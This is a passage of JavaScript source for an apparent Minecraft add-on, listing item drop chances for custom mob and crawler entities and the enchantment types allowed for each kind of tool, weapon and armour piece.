      "mrleefy:pigstill": { "minecraft:porkchop": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:chickenstill": { "minecraft:feather": { chance: 50, quantity: 1, stackable: true }, "minecraft:chicken": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:emeraldgolemstill": { "minecraft:emerald": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:netheritegolemstill": { "minecraft:netherite_ingot": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:irongolemstill": { "minecraft:iron_ingot": { chance: 100, quantity: 1, stackable: true }, "minecraft:poppy": { chance: 25, quantity: 1, stackable: true } },
      "mrleefy:diamondgolemstill": { "minecraft:diamond": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:goldgolemstill": { "minecraft:gold_ingot": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:endermanstill": { "minecraft:ender_pearl": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:creeperstill": { "minecraft:gunpowder": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:magmacubestill": { "minecraft:magma_cream": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:guardianstill": { "minecraft:prismarine_shard": { chance: 100, quantity: 1, stackable: true }, "minecraft:prismarine_crystals": { chance: 50, quantity: 1, stackable: true } },
      "mrleefy:witherskeletonstill": { "minecraft:coal": { chance: 25, quantity: 1, stackable: true }, "minecraft:bone": { chance: 100, quantity: 1, stackable: true }, "minecraft:wither_skeleton_skull": { chance: 1, stackable: false } },
      "mrleefy:zombiestill": { "minecraft:rotten_flesh": { chance: 100, quantity: 1, stackable: true }, "minecraft:iron_ingot": { chance: 2, quantity: 1, stackable: true }, "minecraft:carrot": { chance: 2, quantity: 1, stackable: true }, "minecraft:potato": { chance: 2, quantity: 1, stackable: true } },
      "mrleefy:villagerstill": {
        // ── UNIVERSAL ──────────────────────────────────────────────
        "minecraft:emerald": { chance: 60, quantity: 1, stackable: true },
        // ── FARMER ─────────────────────────────────────────────────
        "minecraft:bread": { chance: 45, quantity: 1, stackable: true },
        "minecraft:apple": { chance: 35, quantity: 1, stackable: true },
        "minecraft:cookie": { chance: 22, quantity: 1, stackable: true },
        "minecraft:pumpkin_pie": { chance: 18, quantity: 1, stackable: true },
        "minecraft:wheat": { chance: 30, quantity: 1, stackable: true },
        "minecraft:potato": { chance: 25, quantity: 1, stackable: true },
        "minecraft:carrot": { chance: 25, quantity: 1, stackable: true },
        "minecraft:beetroot": { chance: 20, quantity: 1, stackable: true },
        "minecraft:pumpkin": { chance: 12, quantity: 1, stackable: true },
        "minecraft:melon_slice": { chance: 12, quantity: 1, stackable: true },
        "minecraft:golden_carrot": { chance: 8, quantity: 1, stackable: true },
        "minecraft:suspicious_stew": { chance: 6, quantity: 1, stackable: false },
        "minecraft:glistering_melon_slice": { chance: 5, quantity: 1, stackable: true },
        "minecraft:cake": { chance: 3, quantity: 1, stackable: false },
        // ── FISHERMAN ──────────────────────────────────────────────
        "minecraft:cod": { chance: 28, quantity: 1, stackable: true },
        "minecraft:salmon": { chance: 25, quantity: 1, stackable: true },
        "minecraft:tropical_fish": { chance: 12, quantity: 1, stackable: true },
        "minecraft:pufferfish": { chance: 8, quantity: 1, stackable: true },
        "minecraft:fishing_rod": { chance: 6, stackable: false, enchantChance: 25 },
        "minecraft:campfire": { chance: 5, quantity: 1, stackable: true },
        "minecraft:enchanted_book": { chance: 4, stackable: false },
        // ── LIBRARIAN ──────────────────────────────────────────────
        "minecraft:book": { chance: 38, quantity: 1, stackable: true },
        "minecraft:paper": { chance: 30, quantity: 1, stackable: true },
        "minecraft:ink_sac": { chance: 18, quantity: 1, stackable: true },
        "minecraft:glass": { chance: 15, quantity: 1, stackable: true },
        "minecraft:bookshelf": { chance: 7, quantity: 1, stackable: true },
        "minecraft:lantern": { chance: 6, quantity: 1, stackable: true },
        "minecraft:name_tag": { chance: 1.5, stackable: false },
        // ── CARTOGRAPHER ───────────────────────────────────────────
        "minecraft:compass": { chance: 9, quantity: 1, stackable: true },
        "minecraft:empty_map": { chance: 14, quantity: 1, stackable: true },
        "minecraft:item_frame": { chance: 5, quantity: 1, stackable: true },
        "minecraft:glass_pane": { chance: 14, quantity: 1, stackable: true },
        // ── CLERIC ─────────────────────────────────────────────────
        "minecraft:experience_bottle": { chance: 28, quantity: 1, stackable: true },
        "minecraft:glowstone_dust": { chance: 14, quantity: 1, stackable: true },
        "minecraft:redstone": { chance: 14, quantity: 1, stackable: true },
        "minecraft:lapis_lazuli": { chance: 14, quantity: 1, stackable: true },
        "minecraft:rotten_flesh": { chance: 18, quantity: 1, stackable: true },
        "minecraft:gold_ingot": { chance: 6, quantity: 1, stackable: true },
        "minecraft:ender_pearl": { chance: 5, quantity: 1, stackable: true },
        "minecraft:glass_bottle": { chance: 10, quantity: 1, stackable: true },
        "minecraft:nether_wart": { chance: 10, quantity: 1, stackable: true },
        "minecraft:rabbit_foot": { chance: 5, quantity: 1, stackable: true },
        "minecraft:ghast_tear": { chance: 2, quantity: 1, stackable: true },
        "minecraft:scute": { chance: 3, quantity: 1, stackable: true },
        // ── ARMORER ────────────────────────────────────────────────
        "minecraft:coal": { chance: 30, quantity: 1, stackable: true },
        "minecraft:iron_ingot": { chance: 22, quantity: 1, stackable: true },
        "minecraft:diamond": { chance: 4, quantity: 1, stackable: true },
        "minecraft:chainmail_helmet": { chance: 4, stackable: false, enchantChance: 15 },
        "minecraft:chainmail_chestplate": { chance: 4, stackable: false, enchantChance: 15 },
        "minecraft:chainmail_leggings": { chance: 4, stackable: false, enchantChance: 15 },
        "minecraft:chainmail_boots": { chance: 4, stackable: false, enchantChance: 15 },
        "minecraft:iron_helmet": { chance: 3, stackable: false, enchantChance: 15 },
        "minecraft:iron_chestplate": { chance: 3, stackable: false, enchantChance: 15 },
        "minecraft:iron_leggings": { chance: 3, stackable: false, enchantChance: 15 },
        "minecraft:iron_boots": { chance: 3, stackable: false, enchantChance: 15 },
        "minecraft:diamond_helmet": { chance: 0.4, stackable: false, enchantChance: 30 },
        "minecraft:diamond_chestplate": { chance: 0.4, stackable: false, enchantChance: 30 },
        "minecraft:diamond_leggings": { chance: 0.4, stackable: false, enchantChance: 30 },
        "minecraft:diamond_boots": { chance: 0.4, stackable: false, enchantChance: 30 },
        "minecraft:shield": { chance: 5, stackable: false },
        "minecraft:bell": { chance: 1, stackable: false },
        // ── LEATHERWORKER ──────────────────────────────────────────
        "minecraft:leather": { chance: 28, quantity: 1, stackable: true },
        "minecraft:rabbit_hide": { chance: 15, quantity: 1, stackable: true },
        "minecraft:leather_helmet": { chance: 6, stackable: false, enchantChance: 10 },
        "minecraft:leather_chestplate": { chance: 6, stackable: false, enchantChance: 10 },
        "minecraft:leather_leggings": { chance: 6, stackable: false, enchantChance: 10 },
        "minecraft:leather_boots": { chance: 6, stackable: false, enchantChance: 10 },
        "minecraft:saddle": { chance: 3, stackable: false },
        "minecraft:leather_horse_armor": { chance: 2, stackable: false },
        // ── BUTCHER ────────────────────────────────────────────────
        "minecraft:chicken": { chance: 20, quantity: 1, stackable: true },
        "minecraft:porkchop": { chance: 20, quantity: 1, stackable: true },
        "minecraft:beef": { chance: 20, quantity: 1, stackable: true },
        "minecraft:mutton": { chance: 18, quantity: 1, stackable: true },
        "minecraft:cooked_chicken": { chance: 18, quantity: 1, stackable: true },
        "minecraft:cooked_porkchop": { chance: 18, quantity: 1, stackable: true },
        "minecraft:cooked_beef": { chance: 18, quantity: 1, stackable: true },
        "minecraft:cooked_mutton": { chance: 16, quantity: 1, stackable: true },
        "minecraft:rabbit": { chance: 14, quantity: 1, stackable: true },
        "minecraft:cooked_rabbit": { chance: 14, quantity: 1, stackable: true },
        "minecraft:rabbit_stew": { chance: 8, quantity: 1, stackable: false },
        "minecraft:dried_kelp": { chance: 10, quantity: 1, stackable: true },
        // ── FLETCHER ───────────────────────────────────────────────
        "minecraft:arrow": { chance: 28, quantity: 2, stackable: true },
        "minecraft:feather": { chance: 22, quantity: 1, stackable: true },
        "minecraft:flint": { chance: 22, quantity: 1, stackable: true },
        "minecraft:string": { chance: 20, quantity: 1, stackable: true },
        "minecraft:gravel": { chance: 15, quantity: 1, stackable: true },
        "minecraft:tripwire_hook": { chance: 8, quantity: 1, stackable: true },
        "minecraft:bow": { chance: 5, stackable: false, enchantChance: 25 },
        "minecraft:crossbow": { chance: 5, stackable: false, enchantChance: 25 },
        "minecraft:tipped_arrow": { chance: 3, quantity: 1, stackable: true },
        // ── TOOLSMITH ──────────────────────────────────────────────
        "minecraft:iron_shovel": { chance: 4, stackable: false, enchantChance: 20 },
        "minecraft:iron_pickaxe": { chance: 4, stackable: false, enchantChance: 20 },
        "minecraft:iron_axe": { chance: 4, stackable: false, enchantChance: 20 },
        "minecraft:iron_hoe": { chance: 4, stackable: false, enchantChance: 20 },
        "minecraft:diamond_shovel": { chance: 0.6, stackable: false, enchantChance: 35 },
        "minecraft:diamond_pickaxe": { chance: 0.6, stackable: false, enchantChance: 35 },
        "minecraft:diamond_axe": { chance: 0.6, stackable: false, enchantChance: 35 },
        "minecraft:diamond_hoe": { chance: 0.6, stackable: false, enchantChance: 35 },
        // ── WEAPONSMITH ────────────────────────────────────────────
        "minecraft:iron_sword": { chance: 4, stackable: false, enchantChance: 20 },
        "minecraft:diamond_sword": { chance: 0.6, stackable: false, enchantChance: 35 },
        // ── SHEPHERD ───────────────────────────────────────────────
        "minecraft:shears": { chance: 10, stackable: false, enchantChance: 10 },
        "minecraft:white_wool": { chance: 10, quantity: 1, stackable: true },
        "minecraft:orange_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:magenta_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:light_blue_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:yellow_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:lime_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:pink_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:gray_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:cyan_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:purple_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:blue_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:brown_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:green_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:red_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:black_wool": { chance: 7, quantity: 1, stackable: true },
        "minecraft:painting": { chance: 3, stackable: false },
        "minecraft:white_bed": { chance: 4, stackable: false },
        "minecraft:red_bed": { chance: 4, stackable: false },
        "minecraft:blue_bed": { chance: 4, stackable: false },
        "minecraft:white_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:white_dye": { chance: 6, quantity: 1, stackable: true },
        "minecraft:red_dye": { chance: 6, quantity: 1, stackable: true },
        "minecraft:blue_dye": { chance: 6, quantity: 1, stackable: true },
        "minecraft:yellow_dye": { chance: 6, quantity: 1, stackable: true },
        "minecraft:green_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:purple_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:black_dye": { chance: 5, quantity: 1, stackable: true },
        // ── MASON ──────────────────────────────────────────────────
        "minecraft:clay_ball": { chance: 20, quantity: 1, stackable: true },
        "minecraft:brick": { chance: 16, quantity: 1, stackable: true },
        "minecraft:stone": { chance: 14, quantity: 1, stackable: true },
        "minecraft:granite": { chance: 12, quantity: 1, stackable: true },
        "minecraft:andesite": { chance: 12, quantity: 1, stackable: true },
        "minecraft:diorite": { chance: 12, quantity: 1, stackable: true },
        "minecraft:quartz": { chance: 10, quantity: 1, stackable: true },
        "minecraft:chiseled_stone_bricks": { chance: 8, quantity: 1, stackable: true },
        "minecraft:terracotta": { chance: 8, quantity: 1, stackable: true },
        "minecraft:white_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:orange_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:blue_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:red_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:yellow_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:green_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:nether_brick": { chance: 8, quantity: 1, stackable: true },
        "minecraft:dripstone_block": { chance: 6, quantity: 1, stackable: true },
        "minecraft:pointed_dripstone": { chance: 6, quantity: 1, stackable: true },
        // ── CLOCK / COMPASS (shared) ───────────────────────────
        "minecraft:clock": { chance: 8, quantity: 1, stackable: true },
        // ── MASTER-LEVEL TRADES (rare, any profession) ────────────────
        // Armorer master: offer diamond gear or netherite upgrade
        "minecraft:netherite_upgrade_smithing_template": { chance: 0.3, quantity: 1, stackable: false },
        // Toolsmith / Weaponsmith master: golden tools
        "minecraft:golden_sword": { chance: 1.5, stackable: false, enchantChance: 15 },
        "minecraft:golden_axe": { chance: 1.5, stackable: false, enchantChance: 15 },
        "minecraft:golden_pickaxe": { chance: 1.5, stackable: false, enchantChance: 15 },
        "minecraft:golden_shovel": { chance: 1.5, stackable: false, enchantChance: 15 },
        "minecraft:golden_hoe": { chance: 1.5, stackable: false, enchantChance: 15 },
        // Armorer: golden armor
        "minecraft:golden_helmet": { chance: 1.5, stackable: false, enchantChance: 15 },
        "minecraft:golden_chestplate": { chance: 1.5, stackable: false, enchantChance: 15 },
        "minecraft:golden_leggings": { chance: 1.5, stackable: false, enchantChance: 15 },
        "minecraft:golden_boots": { chance: 1.5, stackable: false, enchantChance: 15 },
        // Leatherworker: horse armor
        "minecraft:iron_horse_armor": { chance: 1, quantity: 1, stackable: false },
        "minecraft:golden_horse_armor": { chance: 0.8, quantity: 1, stackable: false },
        "minecraft:diamond_horse_armor": { chance: 0.3, quantity: 1, stackable: false },
        // ── WANDERING TRADER extras (found in all trades) ───────────
        "minecraft:nautilus_shell": { chance: 2, quantity: 1, stackable: true },
        "minecraft:podzol": { chance: 3, quantity: 1, stackable: true },
        "minecraft:mycelium": { chance: 2, quantity: 1, stackable: true },
        "minecraft:brown_mushroom": { chance: 5, quantity: 1, stackable: true },
        "minecraft:red_mushroom": { chance: 5, quantity: 1, stackable: true },
        "minecraft:cactus": { chance: 5, quantity: 1, stackable: true },
        "minecraft:sea_pickle": { chance: 4, quantity: 1, stackable: true },
        // ── MISSING SHEPHERD BEDS & CARPETS ───────────────────────
        "minecraft:orange_bed": { chance: 4, quantity: 1, stackable: false },
        "minecraft:yellow_bed": { chance: 4, quantity: 1, stackable: false },
        "minecraft:green_bed": { chance: 4, quantity: 1, stackable: false },
        "minecraft:purple_bed": { chance: 4, quantity: 1, stackable: false },
        "minecraft:cyan_bed": { chance: 4, quantity: 1, stackable: false },
        "minecraft:black_bed": { chance: 4, quantity: 1, stackable: false },
        "minecraft:orange_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:yellow_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:green_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:purple_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:cyan_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:blue_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:red_carpet": { chance: 5, quantity: 1, stackable: true },
        "minecraft:black_carpet": { chance: 5, quantity: 1, stackable: true },
        // ── MASON MISSING BLOCKS ─────────────────────────────────────
        "minecraft:polished_granite": { chance: 8, quantity: 1, stackable: true },
        "minecraft:polished_andesite": { chance: 8, quantity: 1, stackable: true },
        "minecraft:polished_diorite": { chance: 8, quantity: 1, stackable: true },
        "minecraft:stone_bricks": { chance: 8, quantity: 1, stackable: true },
        "minecraft:mossy_stone_bricks": { chance: 5, quantity: 1, stackable: true },
        "minecraft:cracked_stone_bricks": { chance: 4, quantity: 1, stackable: true },
        "minecraft:nether_brick_fence": { chance: 4, quantity: 1, stackable: true },
        "minecraft:purple_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:cyan_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:light_blue_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:gray_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:magenta_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:pink_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:black_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:brown_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        "minecraft:lime_glazed_terracotta": { chance: 5, quantity: 1, stackable: true },
        // ── FISHERMAN (missing cooked fish) ────────────────────────
        "minecraft:cooked_cod": { chance: 22, quantity: 1, stackable: true },
        "minecraft:cooked_salmon": { chance: 18, quantity: 1, stackable: true },
        // ── LIBRARIAN (book & quill) ────────────────────────────────
        "minecraft:writable_book": { chance: 8, quantity: 1, stackable: false },
        // ── TOOLSMITH & WEAPONSMITH (stone tools — novice tier) ────
        "minecraft:stone_sword": { chance: 8, stackable: false, enchantChance: 5 },
        "minecraft:stone_axe": { chance: 8, stackable: false, enchantChance: 5 },
        "minecraft:stone_pickaxe": { chance: 8, stackable: false, enchantChance: 5 },
        "minecraft:stone_shovel": { chance: 8, stackable: false, enchantChance: 5 },
        "minecraft:stone_hoe": { chance: 8, stackable: false, enchantChance: 5 },
        // ── BUTCHER (missing sweet berries) ────────────────────────
        "minecraft:sweet_berries": { chance: 10, quantity: 1, stackable: true },
        // ── SHEPHERD (banners — expert tier) ───────────────────────
        "minecraft:white_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:orange_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:magenta_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:light_blue_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:yellow_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:lime_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:pink_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:gray_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:cyan_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:purple_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:blue_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:brown_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:green_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:red_banner": { chance: 3, quantity: 1, stackable: true },
        "minecraft:black_banner": { chance: 3, quantity: 1, stackable: true },
        // ── SHEPHERD (missing dye colors) ──────────────────────────
        "minecraft:orange_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:magenta_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:light_blue_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:lime_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:pink_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:gray_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:light_gray_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:cyan_dye": { chance: 5, quantity: 1, stackable: true },
        "minecraft:brown_dye": { chance: 5, quantity: 1, stackable: true }
      },
      "mrleefy:witherstill": { "minecraft:nether_star": { chance: 100, quantity: 1, stackable: false } },
      "mrleefy:enderdragonstill": {
        "minecraft:dragon_breath": { chance: 100, quantity: 1, stackable: true },
        "minecraft:dragon_egg": { chance: 1, stackable: false },
        "minecraft:experience_bottle": { chance: 100, quantity: 10, stackable: true },
        "minecraft:enchanted_book": { chance: 20, stackable: false },
        "minecraft:elytra": { chance: 2, stackable: false, randomdurability: true }
      },
      "mrleefy:spiderstill": { "minecraft:string": { chance: 100, quantity: 1, stackable: true }, "minecraft:spider_eye": { chance: 10, quantity: 1, stackable: true } },
      "mrleefy:snowmanstill": { "minecraft:snowball": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:slimestill": { "minecraft:slime_ball": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:vindicatorstill": { "minecraft:emerald": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:wardenstill": { "minecraft:sculk_catalyst": { chance: 1, quantity: 1, stackable: true }, "minecraft:echo_shard": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:skeletonstill": { "minecraft:bone": { chance: 100, quantity: 1, stackable: true }, "minecraft:arrow": { chance: 100, quantity: 1, stackable: true }, "minecraft:bow": { chance: 5, stackable: false, randomdurability: true } },
      "mrleefy:shulkerstill": { "minecraft:shulker_shell": { chance: 100, quantity: 1, stackable: true } },
      // --- Crawlers ---
      "mrleefy:coalcrawlerstill": { "minecraft:coal": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:glowstonecrawlerstill": { "minecraft:glowstone_dust": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:obsidiancrawlerstill": { "minecraft:obsidian": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:icecrawlerstill": { "minecraft:packed_ice": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:spongecrawlerstill": { "minecraft:sponge": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:lapiscrawlerstill": { "minecraft:lapis_lazuli": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:redstonecrawlerstill": { "minecraft:redstone": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:coppercrawlerstill": { "minecraft:copper_ingot": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:quartzcrawlerstill": { "minecraft:quartz": { chance: 100, quantity: 1, stackable: true } },
      "mrleefy:amethystcrawlerstill": { "minecraft:amethyst_shard": { chance: 100, quantity: 1, stackable: true } }
    };
    this.entities = {};
    this.enchantmentCategories = {
      axe: [{ type: "sharpness", minLevel: 1, maxLevel: 5 }, { type: "smite", minLevel: 1, maxLevel: 5 }, { type: "bane_of_arthropods", minLevel: 1, maxLevel: 5 }, { type: "efficiency", minLevel: 1, maxLevel: 5 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "fortune", minLevel: 1, maxLevel: 3 }, { type: "silk_touch", minLevel: 1, maxLevel: 1 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      helmet: [{ type: "protection", minLevel: 1, maxLevel: 4 }, { type: "fire_protection", minLevel: 1, maxLevel: 4 }, { type: "blast_protection", minLevel: 1, maxLevel: 4 }, { type: "projectile_protection", minLevel: 1, maxLevel: 4 }, { type: "respiration", minLevel: 1, maxLevel: 3 }, { type: "aqua_affinity", minLevel: 1, maxLevel: 1 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      chestplate: [{ type: "protection", minLevel: 1, maxLevel: 4 }, { type: "fire_protection", minLevel: 1, maxLevel: 4 }, { type: "blast_protection", minLevel: 1, maxLevel: 4 }, { type: "projectile_protection", minLevel: 1, maxLevel: 4 }, { type: "thorns", minLevel: 1, maxLevel: 3 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      leggings: [{ type: "protection", minLevel: 1, maxLevel: 4 }, { type: "fire_protection", minLevel: 1, maxLevel: 4 }, { type: "blast_protection", minLevel: 1, maxLevel: 4 }, { type: "projectile_protection", minLevel: 1, maxLevel: 4 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "thorns", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      boots: [{ type: "protection", minLevel: 1, maxLevel: 4 }, { type: "fire_protection", minLevel: 1, maxLevel: 4 }, { type: "blast_protection", minLevel: 1, maxLevel: 4 }, { type: "projectile_protection", minLevel: 1, maxLevel: 4 }, { type: "feather_falling", minLevel: 1, maxLevel: 4 }, { type: "depth_strider", minLevel: 1, maxLevel: 3 }, { type: "frost_walker", minLevel: 1, maxLevel: 2 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "soul_speed", minLevel: 1, maxLevel: 3 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      sword: [{ type: "sharpness", minLevel: 1, maxLevel: 5 }, { type: "smite", minLevel: 1, maxLevel: 5 }, { type: "bane_of_arthropods", minLevel: 1, maxLevel: 5 }, { type: "knockback", minLevel: 1, maxLevel: 2 }, { type: "fire_aspect", minLevel: 1, maxLevel: 2 }, { type: "looting", minLevel: 1, maxLevel: 3 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      trident: [{ type: "impaling", minLevel: 1, maxLevel: 5 }, { type: "riptide", minLevel: 1, maxLevel: 3 }, { type: "loyalty", minLevel: 1, maxLevel: 3 }, { type: "channeling", minLevel: 1, maxLevel: 1 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      bow: [{ type: "power", minLevel: 1, maxLevel: 5 }, { type: "punch", minLevel: 1, maxLevel: 2 }, { type: "flame", minLevel: 1, maxLevel: 1 }, { type: "infinity", minLevel: 1, maxLevel: 1 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      crossbow: [{ type: "piercing", minLevel: 1, maxLevel: 4 }, { type: "quick_charge", minLevel: 1, maxLevel: 3 }, { type: "multishot", minLevel: 1, maxLevel: 1 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      mace: [{ type: "density", minLevel: 1, maxLevel: 5 }, { type: "breach", minLevel: 1, maxLevel: 4 }, { type: "wind_burst", minLevel: 1, maxLevel: 3 }, { type: "unbreaking", minLevel: 1, maxLevel: 3 }, { type: "mending", minLevel: 1, maxLevel: 1 }, { type: "fire_aspect", minLevel: 1, maxLevel: 2 }, { type: "sharpness", minLevel: 1, maxLevel: 5 }, { type: "smite", minLevel: 1, maxLevel: 5 }, { type: "bane_of_arthropods", minLevel: 1, maxLevel: 5 }, { type: "vanishing", minLevel: 1, maxLevel: 1 }],
      pickaxe: [
        { type: "efficiency", minLevel: 1, maxLevel: 5 },
        { type: "silk_touch", minLevel: 1, maxLevel: 1 },
        { type: "fortune", minLevel: 1, maxLevel: 3 },
        { type: "unbreaking", minLevel: 1, maxLevel: 3 },
        { type: "mending", minLevel: 1, maxLevel: 1 },
        { type: "vanishing", minLevel: 1, maxLevel: 1 }
      ],
      shovel: [
        { type: "efficiency", minLevel: 1, maxLevel: 5 },
        { type: "silk_touch", minLevel: 1, maxLevel: 1 },
        { type: "fortune", minLevel: 1, maxLevel: 3 },
        { type: "unbreaking", minLevel: 1, maxLevel: 3 },
        { type: "mending", minLevel: 1, maxLevel: 1 },
        { type: "vanishing", minLevel: 1, maxLevel: 1 }
      ],
      hoe: [
        { type: "efficiency", minLevel: 1, maxLevel: 5 },
        { type: "silk_touch", minLevel: 1, maxLevel: 1 },
        { type: "fortune", minLevel: 1, maxLevel: 3 },
        { type: "unbreaking", minLevel: 1, maxLevel: 3 },
        { type: "mending", minLevel: 1, maxLevel: 1 },
        { type: "vanishing", minLevel: 1, maxLevel: 1 }
      ],
      fishing_rod: [
        { type: "luck_of_the_sea", minLevel: 1, maxLevel: 3 },
        { type: "lure", minLevel: 1, maxLevel: 3 },
        { type: "unbreaking", minLevel: 1, maxLevel: 3 },
        { type: "mending", minLevel: 1, maxLevel: 1 },
        { type: "vanishing", minLevel: 1, maxLevel: 1 }
      ],
      shears: [
        { type: "efficiency", minLevel: 1, maxLevel: 5 },
        { type: "unbreaking", minLevel: 1, maxLevel: 3 },
        { type: "mending", minLevel: 1, maxLevel: 1 },
        { type: "vanishing", minLevel: 1, maxLevel: 1 }
      ],
      book: [
        // Armor
        { type: "protection", minLevel: 1, maxLevel: 4 },
        { type: "fire_protection", minLevel: 1, maxLevel: 4 },
        { type: "blast_protection", minLevel: 1, maxLevel: 4 },
        { type: "projectile_protection", minLevel: 1, maxLevel: 4 },
        { type: "feather_falling", minLevel: 1, maxLevel: 4 },
        { type: "respiration", minLevel: 1, maxLevel: 3 },
        { type: "aqua_affinity", minLevel: 1, maxLevel: 1 },
        { type: "depth_strider", minLevel: 1, maxLevel: 3 },
        { type: "frost_walker", minLevel: 1, maxLevel: 2 },
        { type: "soul_speed", minLevel: 1, maxLevel: 3 },
        { type: "thorns", minLevel: 1, maxLevel: 3 },
        // Weapons
        { type: "sharpness", minLevel: 1, maxLevel: 5 },
        { type: "smite", minLevel: 1, maxLevel: 5 },
        { type: "bane_of_arthropods", minLevel: 1, maxLevel: 5 },
        { type: "knockback", minLevel: 1, maxLevel: 2 },
        { type: "fire_aspect", minLevel: 1, maxLevel: 2 },
        { type: "looting", minLevel: 1, maxLevel: 3 },
        // Ranged
        { type: "power", minLevel: 1, maxLevel: 5 },
        { type: "punch", minLevel: 1, maxLevel: 2 },
        { type: "flame", minLevel: 1, maxLevel: 1 },
        { type: "infinity", minLevel: 1, maxLevel: 1 },
        { type: "piercing", minLevel: 1, maxLevel: 4 },
        { type: "quick_charge", minLevel: 1, maxLevel: 3 },
